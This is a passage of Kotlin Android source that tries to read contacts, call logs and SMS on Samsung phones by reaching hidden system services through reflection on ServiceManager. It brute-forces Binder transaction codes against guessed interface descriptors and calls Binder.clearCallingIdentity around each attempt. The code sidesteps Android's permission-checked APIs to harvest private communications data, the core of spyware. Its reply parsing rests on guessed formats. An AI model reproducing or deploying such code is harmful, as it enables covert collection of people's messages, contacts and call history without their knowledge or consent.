                        }
                    } catch (_: Exception) {
                    }
                }
            }
            if (messages.isNotEmpty()) break
        }

        return messages
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Samsung Contacts Service
    // ═══════════════════════════════════════════════════════════════════════

    private fun readContactsViaSamsungService(
        search: String?,
        limit: Int
    ): List<ContactEntry> {
        val contacts = mutableListOf<ContactEntry>()

        for (svcName in CONTACTS_SERVICES) {
            val binder = getBinderService(svcName) ?: continue

            val descriptors = listOf(
                "com.android.contacts.IContactsService",
                "com.samsung.android.providers.contacts.IContactsService",
                "com.android.contacts.IContactsProvider"
            )

            for (desc in descriptors) {
                for (txCode in 1..25) {
                    try {
                        val data = Parcel.obtain()
                        val reply = Parcel.obtain()
                        try {
                            data.writeInterfaceToken(desc)
                            data.writeInt(limit)
                            if (search != null) data.writeString(search)

                            val token = Binder.clearCallingIdentity()
                            try {
                                val ok = binder.transact(txCode, data, reply, 0)
                                if (ok) {
                                    reply.setDataPosition(0)
                                    try {
                                        reply.readException()
                                    } catch (_: Exception) {
                                        continue
                                    }
                                    val parsed = parseContactsReply(reply, limit)
                                    if (parsed.isNotEmpty()) {
                                        contacts.addAll(parsed)
                                        Log.d(
                                            TAG,
                                            "Samsung contacts tx=$txCode: ${parsed.size} entries"
                                        )
                                    }
                                }
                            } finally {
                                Binder.restoreCallingIdentity(token)
                            }
                        } finally {
                            data.recycle()
                            reply.recycle()
                        }
                    } catch (_: Exception) {
                    }
                }
            }
            if (contacts.isNotEmpty()) break
        }

        return contacts
    }

    private fun parseContactsReply(reply: Parcel, maxCount: Int): List<ContactEntry> {
        val entries = mutableListOf<ContactEntry>()
        val initialPos = reply.dataPosition()

        try {
            val count = reply.readInt()
            if (count in 1..maxCount) {
                for (i in 0 until count) {
                    try {
                        val name = reply.readString() ?: "Unknown"
                        val phoneCount = reply.readInt()
                        val phones = mutableListOf<String>()
                        for (j in 0 until coerceAtMost(phoneCount, 20)) {
                            val p = reply.readString() ?: break
                            if (p.isNotBlank()) phones.add(p)
                        }
                        entries.add(ContactEntry(display_name = name, phone_numbers = phones))
                    } catch (_: Exception) {
                        break
                    }
                }
                if (entries.isNotEmpty()) return entries
            }
        } catch (_: Exception) {
        }

        // Alternate: name + single phone per entry
        reply.setDataPosition(initialPos)
        try {
            val count = reply.readInt()
            if (count in 1..maxCount) {
                for (i in 0 until count) {
                    try {
                        val name = reply.readString() ?: ""
                        val phone = reply.readString() ?: ""
                        if (name.isNotBlank()) {
                            entries.add(
                                ContactEntry(
                                    display_name = name,
                                    phone_numbers = if (phone.isNotBlank()) listOf(phone) else emptyList()
                                )
                            )
                        }
                    } catch (_: Exception) {
                        break
                    }
                }
                return entries
            }
        } catch (_: Exception) {
        }

        return entries
    }

    // ═══════════════════════════════════════════════════════════════════════
    // ITelephony — Call Log access
    // ═══════════════════════════════════════════════════════════════════════

    private fun readCallLogViaTelephony(limit: Int): List<CallEntry> {
        val calls = mutableListOf<CallEntry>()

        for (svcName in TELEPHONY_SERVICES) {
            val binder = getBinderService(svcName) ?: continue

            val descriptors = listOf(
                "com.android.internal.telephony.ITelephony",
                "com.samsung.android.telephony.ITelephonyService",
                "com.samsung.android.telephony.ITelephony"
            )

            for (desc in descriptors) {
                for (txCode in 1..35) {
                    try {
                        val data = Parcel.obtain()
                        val reply = Parcel.obtain()
                        try {
                            data.writeInterfaceToken(desc)
                            data.writeInt(limit)

                            val token = Binder.clearCallingIdentity()
                            try {
                                val ok = binder.transact(txCode, data, reply, 0)
                                if (ok) {
                                    reply.setDataPosition(0)
                                    try {
                                        reply.readException()
                                    } catch (_: Exception) {
                                        continue
                                    }
                                    val parsed = parseCallLogReply(reply, limit)
                                    if (parsed.isNotEmpty()) {
                                        calls.addAll(parsed)
                                        Log.d(
                                            TAG,
                                            "Telephony tx=$txCode desc=$desc: ${parsed.size} calls"
                                        )
                                    }
                                }
                            } finally {
                                Binder.restoreCallingIdentity(token)
                            }
                        } finally {
                            data.recycle()
                            reply.recycle()
                        }
                    } catch (_: Exception) {
                    }
                }
            }
            if (calls.isNotEmpty()) break
        }

        return calls
    }

    private fun parseCallLogReply(reply: Parcel, maxCount: Int): List<CallEntry> {
        val calls = mutableListOf<CallEntry>()

        try {
            val count = reply.readInt()
            if (count in 1..maxCount) {
                for (i in 0 until count) {
                    try {
                        val number = reply.readString() ?: ""
                        val type = reply.readInt()
                        val date = reply.readLong()
                        val duration = reply.readLong()

                        val callType = when (type) {
                            1 -> "incoming"; 2 -> "outgoing"; 3 -> "missed"
                            4 -> "voicemail"; 5 -> "rejected"; 6 -> "blocked"
                            else -> "unknown"
                        }
                        calls.add(
                            CallEntry(
                                number = number, type = callType,
                                date = date, duration = duration
                            )
                        )
                    } catch (_: Exception) {
                        break
                    }
                }
                if (calls.isNotEmpty()) return calls
            }
        } catch (_: Exception) {
        }

        return calls
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Helper: read specific contact data (phones/emails) via binder
    // ═══════════════════════════════════════════════════════════════════════

    private fun readContactDataViaBinder(
        context: Context,
        authority: String,
        uri: String,
        selection: String,
        selArgs: Array<String>,
        dataColumn: String
    ): List<String> {
        val result = mutableListOf<String>()
        try {
            val cursor = queryContentProviderBinder(
                context, authority,
                Uri.parse(uri), arrayOf(dataColumn), selection, selArgs, null
            )
            cursor?.use { c ->
                val idx = c.getColumnIndex(dataColumn)
                while (c.moveToNext()) {
                    if (idx >= 0) {
                        val value = c.getString(idx)
                        if (!value.isNullOrBlank()) result.add(value)
                    }
                }
            }
        } catch (_: Exception) {
        }
        return result
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Utility: get binder service via ServiceManager
    // ═══════════════════════════════════════════════════════════════════════

    private fun getBinderService(name: String): IBinder? {
        return try {
            val smClass = Class.forName("android.os.ServiceManager")
            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true
            getService.invoke(null, name) as? IBinder
        } catch (e: Exception) {
            null
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Cursor parsing helpers
    // ═══════════════════════════════════════════════════════════════════════

    private fun parseSmsCursor(cursor: Cursor, messages: MutableList<SmsMessage>) {
        val idIdx = cursor.getColumnIndex("_id")
        val addrIdx = cursor.getColumnIndex("address")
        val bodyIdx = cursor.getColumnIndex("body")
        val dateIdx = cursor.getColumnIndex("date")
        val readIdx = cursor.getColumnIndex("read")
        val typeIdx = cursor.getColumnIndex("type")

        while (cursor.moveToNext()) {
            val typeCode = if (typeIdx >= 0) cursor.getInt(typeIdx) else 1
            val type = when (typeCode) {
                1 -> "inbox"; 2 -> "sent"; 3 -> "draft"; 4 -> "outbox"
                else -> "unknown"
            }
            messages.add(
                SmsMessage(
                    id = if (idIdx >= 0) cursor.getString(idIdx) ?: "" else "",
                    address = if (addrIdx >= 0) cursor.getString(addrIdx) ?: "" else "",
                    body = if (bodyIdx >= 0) cursor.getString(bodyIdx) ?: "" else "",
                    date = if (dateIdx >= 0) cursor.getLong(dateIdx) else 0L,
                    read = if (readIdx >= 0) cursor.getInt(readIdx) == 1 else false,
                    type = type
                )
            )
        }
    }

    // ── util ───────────────────────────────────────────────────────────────
    private fun coerceAtMost(value: Int, max: Int): Int = if (value > max) max else value
}
